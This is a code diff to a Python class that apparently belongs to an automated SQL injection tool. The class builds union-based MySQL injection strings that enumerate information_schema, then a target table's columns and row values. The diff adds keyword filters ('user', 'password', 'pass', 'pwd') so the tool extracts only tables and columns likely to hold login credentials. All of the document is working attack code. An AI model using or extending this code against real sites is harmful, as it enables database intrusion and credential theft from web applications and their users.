@@ -12,6 +12,9 @@ class Builder:
         self.page = page
         self.union_params = mysql_params
         self.schema_params = ['table_name']
+        self.table_keywords = ['user', 'usr', 'password', 'pass', 'pwd']
+        self.column_keywords = ['user', 'usr', 'password', 'pass', 'pwd']
+        self.exclude = set(open('./lists/mysql/excluded_tables').readlines())
 
         # Default values, can be changed in flag
         self.offset = 0
@@ -35,7 +38,7 @@ class Builder:
     def union(self, num_cols, magic_col):
         """ :num_cols:  Number of columns for UNION statement.
             :magic_col: Column number that is most visible, and therefore used for injection parameter.
-            :returns:   All basic union-based injections as a dict of strings.
+            :returns:   Dict of strings. All basic union-based injections.
         """
         injections = {}
         union_urls = self.union_nums(num_cols) 
@@ -49,7 +52,7 @@ class Builder:
         """ Uses information_schema.columns to get tables in DB.
             :num_cols:  Number of columns for UNION statement.
             :magic_col: Column number that is most visible, and therefore used for injection parameter.
-            :returns:   Dict of strings with queries regarding information_schema.
+            :returns:   Dict of strings. Queries regarding information_schema.
         """
         injections = {}
         union_urls = self.union_nums(num_cols) 
@@ -62,11 +65,12 @@ class Builder:
 
     
     def columns(self, num_cols, magic_col, tables):
-        """ Build SQLI to get columns of a specified table.
+        """ Build SQLI to get columns of all specified tables.
+            Default behavior parses list of tables for those that has specific sub-strings.
             :num_cols:  Number of columns for UNION statement.
             :magic_col: Column number that is most visible, and therefore used for injection parameter.
-            :tables: List of tables to get columns for.
-            :returns:   Dict of strings->strings with queries regarding table's columns
+            :tables:    List of tables to get columns for.
+            :returns:   Dict of strings->strings. Key table_name, value SQLi for columns.
         """
 
         injections = {}
@@ -77,30 +81,31 @@ class Builder:
         a += self.delimiter + 'where' + self.delimiter + 'table_name='
         
         for table in tables:
-            injections[table] = a + "'" + table + "'"
+            if any(i in str(table).lower() for i in self.table_keywords):
+                injections[table] = a + "'" + table + "'"
 
         return injections
 
-    def rows(self, num_cols, magic_col, table_name, col_names):
+    def rows(self, num_cols, magic_col, table, columns):
         """ Build SQLI to get values of each column in a specified table.
+            Default behavior only returns queries about columns in self.column_keywords.
             :num_cols:      Number of columns for UNION statement.
             :magic_col:     Column number that is most visible, and therefore used for injection parameter.
-            :table_name:    String representing table name.
-            :col_names:     List of column names in table.
-            :returns:       Dict of strings->strings with queries regarding table's columns
+            :table:         String representing table name.
+            :columns:       List of column names in table.
+            :returns:       Dict of strings->strings with queries regarding table's columns.
         """
 
         injections = {}
         union_urls = self.union_nums(num_cols) 
 
-        for col_name in col_names:
-            union_urls[magic_col - 1] = self.delimiter + col_name
-            injections[col_name] = self.null_url + self.union_string + ','.join(union_urls)
-            injections[col_name] += self.delimiter + 'from' + self.delimiter + table_name
+        for column in columns:
+            if any(i in str(column).lower() for i in self.column_keywords):
+                union_urls[magic_col - 1] = self.delimiter + column
+                injections[column] = self.null_url + self.union_string + ','.join(union_urls)
+                injections[column] += self.delimiter + 'from' + self.delimiter + table
 
         return injections 
-
-
 
     def blind():
         return 0
